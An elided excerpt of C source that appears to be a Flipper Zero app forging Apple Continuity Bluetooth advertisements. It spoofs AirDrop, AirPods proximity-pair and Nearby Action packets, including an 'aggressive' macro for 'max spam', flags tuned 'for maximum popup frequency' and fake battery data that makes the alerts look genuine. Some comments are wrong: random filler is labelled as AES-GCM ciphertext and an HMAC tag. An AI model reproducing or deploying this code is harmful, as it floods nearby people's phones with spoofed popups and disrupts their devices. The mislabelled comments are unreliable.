...
static const struct {
    ...
    // NEW: Additional actions for iOS 17.2+
...
// NEW: Realistic battery generation for authentic device simulation
static BatteryStatus generate_realistic_battery(void) {
    BatteryStatus battery;
    
    // Generate realistic battery level: 30-100% (devices typically below 100%)
    battery.level = 30 + (rand() % 71);
    
    // Charging probability: ~30% of devices charging
    battery.is_charging = (rand() % 10) < 3;
    
    // Case open probability: ~10% for true wireless earbuds
    battery.case_open = (rand() % 10) < 1;
    
    return battery;
}

// NEW AGGRESSIVE: Generate rapid action variants for max spam (INLINE)
#define get_aggressive_nearby_action() \
    ((rand() % 100) < 60 ? 0x20 : na_actions[rand() % na_actions_count].value)
...
static void make_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
    ...
    // Apple Continuity BLE Advertisement Header
    packet[i++] = size - 1; // Advertisement Data Length
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific Data)
    packet[i++] = 0x4C; // Company ID Low (Apple, Inc.)
    packet[i++] = 0x00; // Company ID High
    packet[i++] = type; // Continuity Type ID
    packet[i] = size - i - 1; // Continuity Data Length
    i++;

    switch(type) {
    case ContinuityTypeAirDrop: {
        // AirDrop payload (iOS 17+ compatible)
        packet[i++] = 0x00; // Sequence zeros
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x00; // ...
        packet[i++] = 0x01; // Protocol Version
        packet[i++] = (rand() % 256); // AppleID Hash Byte 1
        packet[i++] = (rand() % 256); // AppleID Hash Byte 2
        packet[i++] = (rand() % 256); // Phone Number Hash Byte 1
        packet[i++] = (rand() % 256); // Phone Number Hash Byte 2
        packet[i++] = (rand() % 256); // Email Hash Byte 1
        packet[i++] = (rand() % 256); // Email Hash Byte 2
        packet[i++] = (rand() % 256); // Secondary Email Hash Byte 1
        packet[i++] = (rand() % 256); // Secondary Email Hash Byte 2
        packet[i++] = 0x00; // Padding
        break;
    }

    case ContinuityTypeProximityPair: {
        // iOS 17+ Proximity Pair (Enhanced AirPods Detection)
        uint16_t model;
        uint8_t color;
        ...
        if(cfg && cfg->data.proximity_pair.prefix != 0x00) {
            ...
            // Optimized prefix selection for iOS 17+ device detection
            if(model == 0x0055 || model == 0x0030)
                prefix = 0x05; // AirTag marker
            else
                prefix = 0x01; // Paired device (AirPods, Beats, etc.)
        }

        // NEW: Generate realistic battery status
        BatteryStatus battery = generate_realistic_battery();

        // iOS 17+ Proximity Pair payload (SHORT RANGE - requires close proximity)
        packet[i++] = prefix; // Device Status Prefix (0x01=Paired, 0x05=AirTag, 0x07=New)
        packet[i++] = (model >> 0x08) & 0xFF; // Apple Device Model ID (High byte)
        packet[i++] = (model >> 0x00) & 0xFF; // Apple Device Model ID (Low byte)
        packet[i++] = 0x55; // Device Status Byte (Connected/Ready to Pair)
        
        // Enhanced battery encoding: realistic simulation instead of random
        uint8_t left_battery = battery.level / 10;  // 0-10 scale
        uint8_t right_battery = battery.level / 10;
        if(battery.case_open) right_battery = 0;  // Case open = right earbud disconnected
        packet[i++] = ((left_battery & 0x0F) << 4) + (right_battery & 0x0F);
        
        // Charging status + case battery
        ...
        packet[i++] = (rand() % 256); // Lid Open Counter (variation)
        packet[i++] = color; // Device Color Identifier (accurate variant)
        packet[i++] = 0x00; // Reserved Byte (Standard)
        // iOS 17: Encrypted payload - NOTE: Limited by Apple's proximity pairing design
        furi_hal_random_fill_buf(&packet[i], 16); // Full 16-byte AES-GCM encrypted data
        i += 16;
        break;
    }
    ...
    case ContinuityTypeNearbyAction: {
        // iOS 17+ Nearby Action alerts (Setup, AppleTV, HomePod, etc.)
        uint8_t action;
        switch(payload ? payload->mode : PayloadModeRandom) {
        case PayloadModeRandom:
        default:
        ...
        if(cfg && cfg->data.nearby_action.flags != 0x00) {
            ...
            // iOS 17+ optimized flags for maximum popup frequency
            flags = 0xC0; // High priority notification flag
            if(action == 0x20 && rand() % 2) flags--; // Enhanced 'Join This AppleTV?' mode
            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device' variation
        }

        // NEW: Include battery status for more realistic alerts
        BatteryStatus battery = generate_realistic_battery();
        
        packet[i++] = flags; // Action Flags (Priority/Behavior modifiers)
        packet[i++] = action; // Action Type ID (Setup, AppleTV, HomePod, etc.)
        packet[i++] = (battery.level / 10) & 0x0F; // Battery percentage encoded (0-10 scale)
        furi_hal_random_fill_buf(&packet[i], 2); // HMAC-SHA256 Authentication Tag
        i += 2;
        break;
    }
